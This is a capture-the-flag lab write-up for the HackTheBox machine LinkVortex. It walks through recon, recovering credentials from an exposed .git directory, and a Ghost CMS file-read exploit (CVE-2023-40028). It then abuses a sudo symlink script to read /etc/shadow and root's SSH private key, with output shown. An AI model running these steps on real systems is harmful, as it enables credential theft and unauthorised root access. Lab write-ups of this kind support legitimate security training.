
## <span style="color: red; font-weight: bold;">Recon</span>
### <span style="color: #3498eb;">nmap</span>

`nmap` finds two open TCP ports ssh(22) and http(80)

```zsh
❯ sudo nmap -sCV --min-rate 3000 -T 4  -p- -oA ./nmap/linkvortex 10.10.11.47
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 05:02 EST
Nmap scan report for linkvortex.htb (10.10.11.47)
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-server-header: Apache
|_http-generator: Ghost 5.58
|_http-title: BitByBit Hardware
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.03 seconds

```

We will check the paths in `robots.txt` later.
### <span style="color: #3498eb;">Website TCP 80</span>

Add to `/etc/hosts` file

```zsh
❯ echo 10.10.11.47 linkvortex.htb | sudo tee -a /etc/hosts
10.10.11.47 linkvortex.htb
```

#### <span style="color: #ebe134;">Site</span>

`LinkVortex` is probably a site that gives some ideas about computer hardware.

![](images/1.png)

Let's see what `robots.txt` has:

```zsh
❯ curl http://linkvortex.htb/robots.txt
User-agent: *
Sitemap: http://linkvortex.htb/sitemap.xml
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/
```

There is nothing interesting about checking `/sitemap.xml`

![](images/2.png)

Oh, there is a login page at `http://linkvortex.htb/ghost`

![](images/3.png)

I tried a few logins but failed.
#### <span style="color: #ebe134;">Subs</span>

After walking around a bit more and finding nothing special...
Using `ffuf` found `http://dev.linkvortex.htb`

```zsh
❯ ffuf -c -u http://linkvortex.htb/ -H "Host:FUZZ.linkvortex.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 230

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 230
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 243ms]
```

Go to `http://dev.linkvortex.htb/`

![](images/4.png)

Search deeper with `dirsearch`

```zsh
❯ dirsearch -u http://dev.linkvortex.htb/ -i 200
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/linkvortex/reports/http_dev.linkvortex.htb/__24-12-28_05-37-12.txt

Target: http://dev.linkvortex.htb/

[05:37:12] Starting: 
[05:37:20] 200 -  620B  - /.git/hooks/                                      
[05:37:20] 200 -   41B  - /.git/HEAD                                        
[05:37:20] 200 -   73B  - /.git/description                                 
[05:37:20] 200 -  557B  - /.git/
[05:37:20] 200 -  201B  - /.git/config                                      
[05:37:20] 200 -  402B  - /.git/info/                                       
[05:37:20] 200 -  240B  - /.git/info/exclude                                
[05:37:20] 200 -  175B  - /.git/logs/HEAD                                   
[05:37:20] 200 -  401B  - /.git/logs/                                       
[05:37:20] 200 -  147B  - /.git/packed-refs                                 
[05:37:20] 200 -  418B  - /.git/objects/
[05:37:20] 200 -  393B  - /.git/refs/                                       
[05:37:23] 200 -  691KB - /.git/index 
```

Use [`GitHack`](https://github.com/lijiejie/GitHack/blob/master/GitHack.py) to get the files:

```zsh
❯ python GitHack.py -u "http://dev.linkvortex.htb/.git/"
```

This system is deployed on docker:

```zsh
❯ tree
.
├── Dockerfile.ghost
└── ghost
    └── core
        └── test
            └── regression
                └── api
                    └── admin
                        └── authentication.test.js

7 directories, 2 files
```

Get the info:

One thing to note here is if we have access or read permissions to the file in the system: `/var/lib/ghost/config.production.json`

```zsh
❯ cat Dockerfile.ghost
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]

```

Search for password in remaining file:

```zsh
❯ cat ghost/core/test/regression/api/admin/authentication.test.js | grep 'passw*'
            const password = 'OctopiFociPilfer45';
                        password,
            await agent.loginAs(email, password);
                        password: 'thisissupersafe',
                        password: 'thisissupersafe',
            const password = 'thisissupersafe';
                        password,
            await cleanAgent.loginAs(email, password);
                        password: 'lel123456',
                        password: '12345678910',
                        password: '12345678910',
        it('reset password', async function () {
                password: ownerUser.get('password')
            await agent.put('authentication/password_reset')
                    password_reset: [{
        it('reset password: invalid token', async function () {
                .put('authentication/password_reset')
                    password_reset: [{
        it('reset password: expired token', async function () {
                password: ownerUser.get('password')
                .put('authentication/password_reset')
                    password_reset: [{
        it('reset password: unmatched token', async function () {
                password: 'invalid_password'
                .put('authentication/password_reset')
                    password_reset: [{
        it('reset password: generate reset token', async function () {
                .post('authentication/password_reset')
                    password_reset: [{
    describe('Reset all passwords', function () {
        it('reset all passwords returns 204', async function () {
            await agent.post('authentication/global_password_reset')
```

Successfully logged in to `http://linkvortex.htb/ghost/` with credentials `admin@linkvortex.htb:OctopiFociPilfer45`

![](images/5.png)


In `Setting -> About Ghost` we find its version:


![](images/6.png)

## <span style="color: red; font-weight: bold;">Shell as</span> **`bob`**
### <span style="color: #3498eb;">Ghost 5.58 exploit</span>

I found the exploit documentation for `Ghost CMS 5.58` here: https://github.com/0xyassine/CVE-2023-40028

Repair the path and exploit:

![](images/7.png)

I tried reading the `/etc/passwd` file

```zsh
❯ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
file> 
```

We can read the configuration files to get more information, pay attention to the configuration file we see in `Dockerfile.ghost`

### <span style="color: #3498eb;">Get the password</span>

In the previous section when reading the information that `GitHack` downloaded, we noted `/var/lib/ghost/config.production.json`
Let's try reading this configuration file.

```zsh
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
file> 
```


### <span style="color: #3498eb;">Foot hold</span>

Accessible via ssh with credentials: `bob:fibber-talented-worth`

And we get the shell of `bob`.

```zsh
❯ ssh bob@linkvortex.htb
The authenticity of host 'linkvortex.htb (10.10.11.47)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
bob@linkvortex.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@linkvortex:~$ 
```

## <span style="color: red; font-weight: bold;">Shell as root</span>

### <span style="color: #3498eb;">List sudo permissions</span>

It is possible to run `/usr/bin/bash /opt/ghost/clean_symlink.sh *.png` without a password with `sudo`:

```zsh
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

This is definitely an exploit to gain `root` privileges.
### <span style="color: #3498eb;">clean_symlink.sh</span>

#### <span style="color: #ebe134;">Analysis</span>

Look, we have access to read this script:

```zsh
bob@linkvortex:~$ ll /opt/ghost/clean_symlink.sh 
-rwxr--r-- 1 root root 745 Nov  1 08:46 /opt/ghost/clean_symlink.sh*
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh 
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
bob@linkvortex:~$ 
```

This code is primarily intended to protect the system by quarantining or removing potentially dangerous or invalid symbolic links. However, there is a problem here

Manipulating the `CHECK_CONTENT` environment variable
The script uses `CHECK_CONTENT` without checking its safety.

The variable is not explicitly set to true/false, which can lead to unwanted execution if an attacker changes the value of the variable.

The script does handle symbolic links, but if the system allows regular users to create symbolic links that point to sensitive or executable files, an attacker can exploit this.

The `$QUAR_DIR` variable is fixed to `/var/quarantined`. However, if a symbolic link in `$QUAR_DIR` points elsewhere, an attacker could move files from a critical directory into `/var/quarantined` and the contents would be accessible to a normal user.
#### <span style="color: #ebe134;">Exploit</span>

##### Using CHECK_CONTENT to read sensitive content

The variable `CHECK_CONTENT` is checked by the script without being validated safely. Although it is not executed directly in the script, we can still abuse it to display sensitive file content. I will first assign it to a .txt file and then assign it to a .png, try with the `/etc/shadow` file.

```zsh
bob@linkvortex:~$ ln -s /etc/shadow shadow.txt
bob@linkvortex:~$ ln -s /home/bob/shadow.txt shadow.png
bob@linkvortex:~$ export CHECK_CONTENT=true
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh shadow.png
Link found [ shadow.png ] , moving it to quarantine
Content:
root:$y$j9T$C3zg87gHwrCXO0vl4igIh/$iisf9sVwilKAi7mI5p1FqQslJWM9t2.YUWznIPC/XIA:19814:0:99999:7:::

[...]

bob:$6$rounds=656000$4p3mw8hAd9ir.25f$ocGm9nW1TM2AB8Z.l0K.hi43bOrm3oxQsaKFACMoS2UL.tIXxSW3u/xsClrvkEhP5s.GUpdIvCX3qRtppDV8r.:19814:0:99999:7:::
dnsmasq:*:19814:0:99999:7:::
_laurel:!:20057::::::
bob@linkvortex:~$ 
```

The rest is simply to get the ssh key of the `root` user

```zsh
bob@linkvortex:~$ ln -s /root/.ssh/id_rsa id_rsa.txt
bob@linkvortex:~$ ln -s /home/bob/id_rsa.txt ssh.png
bob@linkvortex:~$ export CHECK_CONTENT=true
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ssh.png
Link found [ ssh.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T
q2egYfeMmgI9IoM0DdyDKS4vG+lIoWoJEfZf+cVwaZIzTZwKm7ECbF2Oy+u2SD+X7lG9A6
V1xkmWhQWEvCiI22UjIoFkI0oOfDrm6ZQTyZF99AqBVcwGCjEA67eEKt/5oejN5YgL7Ipu
6sKpMThUctYpWnzAc4yBN/mavhY7v5+TEV0FzPYZJ2spoeB3OGBcVNzSL41ctOiqGVZ7yX
TQ6pQUZxR4zqueIZ7yHVsw5j0eeqlF8OvHT81wbS5ozJBgtjxySWrRkkKAcY11tkTln6NK
CssRzP1r9kbmgHswClErHLL/CaBb/04g65A0xESAt5H1wuSXgmipZT8Mq54lZ4ZNMgPi53
jzZbaHGHACGxLgrBK5u4mF3vLfSG206ilAgU1sUETdkVz8wYuQb2S4Ct0AT14obmje7oqS
0cBqVEY8/m6olYaf/U8dwE/w9beosH6T7arEUwnhAAAFiDyG/Tk8hv05AAAAB3NzaC1yc2
......................................................................
......................................................................
......................................................................
VRdoXs4Iz6xMzJwqSWze+NchBlkUigBZdfcQMkIOxzj4N+mWEHru5GKYRDwL/sSxQy0tJ4
MXXgHw/58xyOE82E8n/SctmyVnHOdxAWldJeycATNJLnd0h3LnNM24vR4GvQVQ4b8EAJjj
rF3BlPov1MoK2/X3qdlwiKxFKYB4tFtugqcuXz54bkKLtLAMf9CszzVBxQqDvqLU9NAAAA
wG5DcRVnEPzKTCXAA6lNcQbIqBNyGlT0Wx0eaZ/i6oariiIm3630t2+dzohFCwh2eXS8nZ
VACuS94oITmJfcOnzXnWXiO+cuokbyb2Wmp1VcYKaBJd6S7pM1YhvQGo1JVKWe7d4g88MF
Mbf5tJRjIBdWS19frqYZDhoYUljq5ZhRaF5F/sa6cDmmMDwPMMxN7cfhRLbJ3xEIL7Kxm+
TWYfUfzJ/WhkOGkXa3q46Fhn7Z1q/qMlC7nBlJM9Iz24HAxAAAAMEAw8yotRf9ZT7intLC
+20m3kb27t8TQT5a/B7UW7UlcT61HdmGO7nKGJuydhobj7gbOvBJ6u6PlJyjxRt/bT601G
QMYCJ4zSjvxSyFaG1a0KolKuxa/9+OKNSvulSyIY/N5//uxZcOrI5hV20IiH580MqL+oU6
lM0jKFMrPoCN830kW4XimLNuRP2nar+BXKuTq9MlfwnmSe/grD9V3Qmg3qh7rieWj9uIad
1G+1d3wPKKT0ztZTPauIZyWzWpOwKVAAAAwQDKF/xbVD+t+vVEUOQiAphz6g1dnArKqf5M
SPhA2PhxB3iAqyHedSHQxp6MAlO8hbLpRHbUFyu+9qlPVrj36DmLHr2H9yHa7PZ34yRfoy
+UylRlepPz7Rw+vhGeQKuQJfkFwR/yaS7Cgy2UyM025EEtEeU3z5irLA2xlocPFijw4gUc
xmo6eXMvU90HVbakUoRspYWISr51uVEvIDuNcZUJlseINXimZkrkD40QTMrYJc9slj9wkA
ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```
##### Shell as root

Connect as `root` via ssh key:

```zsh
❯ chmod 600 id_rsa_root

❯ ssh root@linkvortex.htb -i id_rsa_root
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
root@linkvortex:~# cat root.txt 
46f...................c83c7572f4
root@linkvortex:~# 
```


![](images/8.png)